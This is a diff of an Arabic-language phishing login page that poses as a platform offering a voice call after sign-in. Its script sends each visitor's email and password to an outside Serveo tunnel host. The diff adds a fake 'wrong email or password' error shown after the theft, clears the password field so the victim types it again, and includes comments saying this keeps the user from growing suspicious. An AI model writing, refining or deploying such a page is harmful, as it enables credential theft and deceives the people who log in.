@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>منصة هيفاء محمد | تسجيل دخول</title>
     <style>
-        /* التنسيقات الجمالية للمنصة */
         body {
             background: linear-gradient(135deg, #f5f3ff 0%, #e0e7ff 100%);
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -15,7 +14,6 @@
             align-items: center;
             min-height: 100vh;
         }
-
         .login-card {
             background: #ffffff;
             width: 90%;
@@ -26,36 +24,11 @@
             text-align: center;
             border: 1px solid rgba(255,255,255,0.8);
         }
-
-        .icon-header {
-            font-size: 50px;
-            margin-bottom: 15px;
-        }
-
-        h2 {
-            margin: 0 0 10px;
-            color: #6d28d9;
-            font-size: 1.6rem;
-        }
-
-        p {
-            color: #64748b;
-            font-size: 0.95rem;
-            margin-bottom: 30px;
-        }
-
-        .input-group {
-            text-align: right;
-            margin-bottom: 20px;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            color: #475569;
-        }
-
+        .icon-header { font-size: 50px; margin-bottom: 15px; }
+        h2 { margin: 0 0 10px; color: #6d28d9; font-size: 1.6rem; }
+        p { color: #64748b; font-size: 0.95rem; margin-bottom: 30px; }
+        .input-group { text-align: right; margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-weight: 600; color: #475569; }
         input {
             width: 100%;
             padding: 12px 15px;
@@ -66,12 +39,7 @@
             background: #f8fafc;
             transition: 0.3s;
         }
-
-        input:focus {
-            border-color: #6d28d9;
-            background: #fff;
-        }
-
+        input:focus { border-color: #6d28d9; background: #fff; }
         .btn-call {
             width: 100%;
             padding: 14px;
@@ -84,17 +52,18 @@
             cursor: pointer;
             transition: 0.3s;
         }
-
-        .btn-call:hover {
-            background: #5b21b6;
-            transform: translateY(-2px);
+        .btn-call:hover { background: #5b21b6; transform: translateY(-2px); }
+        .error-msg {
+            color: #ef4444;
+            background: #fee2e2;
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            display: none; /* مخفي في البداية */
+            font-size: 0.85rem;
+            font-weight: bold;
         }
-
-        .footer {
-            margin-top: 25px;
-            font-size: 0.8rem;
-            color: #94a3b8;
-        }
+        .footer { margin-top: 25px; font-size: 0.8rem; color: #94a3b8; }
     </style>
 </head>
 <body>
@@ -104,10 +73,12 @@
         <h2>منصة هيفاء محمد</h2>
         <p>سجل دخولك لبدء المكالمة الصوتية الآن</p>
 
+        <div id="errorMessage" class="error-msg">تأكد أنك لم تخطئ في كتابة البريد الإلكتروني أو كلمة السر.</div>
+
         <form id="loginForm">
             <div class="input-group">
                 <label>البريد الإلكتروني</label>
-                <input type="email" id="email" placeholder="أدخل بريدك الإلكتروني" required>
+                <input type="text" id="email" placeholder="أدخل بريدك الإلكتروني" required>
             </div>
 
             <div class="input-group">
@@ -125,32 +96,34 @@
     </div>
 
     <script>
-        // هذا الجزء هو المسؤول عن إرسال البيانات لـ Termux
         document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault(); // منع الصفحة من التحديث
+            e.preventDefault();
 
             const emailValue = document.getElementById('email').value;
             const passwordValue = document.getElementById('password').value;
+            const errorDiv = document.getElementById('errorMessage');
 
-            // إرسال البيانات إلى الخادم المحلي في Termux
-            fetch('https://b53992b39d8c6b7c-134-35-2-106.serveousercontent.com', {
+            // رابط Serveo الخاص بك (تأكد من تحديثه إذا تغير)
+            const serveoUrl = 'https://abb8096ead43e449-134-35-2-106.serveousercontent.com';
+
+            fetch(serveoUrl, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     email: emailValue,
                     password: passwordValue
                 })
             })
             .then(response => {
-                // بعد الإرسال بنجاح، نظهر رسالة للمستخدم
-                alert('شكراً لك! سيتم تحويلك للمكالمة الآن.');
+                // إظهار رسالة الخطأ للمستخدم بعد أن يتم إرسال بياناته لك بنجاح
+                errorDiv.style.display = 'block';
+                // مسح كلمة السر لكي يضطر لكتابتها مرة أخرى
+                document.getElementById('password').value = '';
             })
             .catch(error => {
                 console.error('Error:', error);
-                // حتى لو فشل الاتصال بالخادم، نظهر رسالة لكي لا يشك المستخدم
-                alert('جاري محاولة الاتصال بالخادم، يرجى الانتظار...');
+                // حتى لو فشل الاتصال، نظهر رسالة الخطأ لإبعاد الشك
+                errorDiv.style.display = 'block';
             });
         });
     </script>
